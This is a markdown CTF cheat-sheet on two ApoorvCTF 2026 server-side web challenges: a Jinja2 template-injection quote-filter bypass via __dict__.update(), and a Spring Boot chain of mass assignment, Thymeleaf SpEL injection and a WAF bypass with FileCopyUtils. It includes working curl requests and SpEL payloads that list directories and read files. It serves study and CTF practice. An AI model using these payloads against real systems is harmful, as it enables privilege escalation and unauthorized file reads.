# CTF Web - Server-Side (2024-2026)

Modern SSTI / auth / template mechanics from 2024-2026. For the canonical toolbox (SQLi, XXE, command injection, PHP juggling, deserialization), see [server-side.md](server-side.md).

## Table of Contents
- [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
- [Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)

---

## SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)

**Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.

```python
# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
# But keyword arguments don't need quotes:
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**How it works:**
1. `player.__dict__.update(power_level=9999999)` — modifies object attribute directly via keyword arg (no quotes needed)
2. `or player.name` — `dict.update()` returns `None` (falsy), so Jinja2 renders `player.name` as output
3. The attribute change persists across requests in the session

**Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).

---
## Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)

**Pattern (Sugar Heist):** Spring Boot app with Thymeleaf template preview endpoint. WAF blocks standard file I/O classes (`Runtime`, `ProcessBuilder`, `FileInputStream`) but not Spring framework utilities.

**Attack chain:**
1. **Mass assignment** to gain admin role (add `"role": "ADMIN"` to registration JSON)
2. **SpEL injection** via template preview endpoint
3. **WAF bypass** using `org.springframework.util.FileCopyUtils` instead of blocked classes

```bash
# Step 1: Register as admin via mass assignment
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'

# Step 2: Directory listing via SpEL (java.io.File not blocked)
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# Step 3: Read flag using Spring FileCopyUtils + string concat to bypass WAF
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

**Key insight:** Distroless containers have no shell (`/bin/sh`), making `Runtime.exec()` useless even without WAF. Spring's `FileCopyUtils.copyToByteArray()` reads files without spawning processes. String concatenation (`"fl"+"ag.txt"`) bypasses static keyword matching in WAFs.

**Alternative SpEL file read payloads:**
```text
${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
```

**Detection:** Spring Boot with `/api/admin/preview` or similar template rendering endpoint. Thymeleaf error messages in responses. `X-Api-Token` header pattern.

---
